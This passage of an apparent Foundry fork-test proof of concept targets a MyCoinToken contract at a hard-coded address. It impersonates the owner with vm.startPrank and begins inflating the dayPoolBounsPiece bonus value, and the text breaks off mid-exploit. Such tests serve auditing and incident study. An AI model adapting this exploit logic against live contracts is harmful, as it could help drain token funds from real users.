    function dayPoolBounsPiece(string memory) external view returns (uint256);
    function dayPoolBouns(string memory) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed beyond the default fork setup
        // We'll get the owner in the exploit code
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the owner address
        address owner = MyCoinToken(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Get yesterday's date
        (string memory yesToday, ) = MyCoinToken(TARGET).getDays();

        // Set dayPoolBounsPiece to a very high value (1e18 * 10^9)
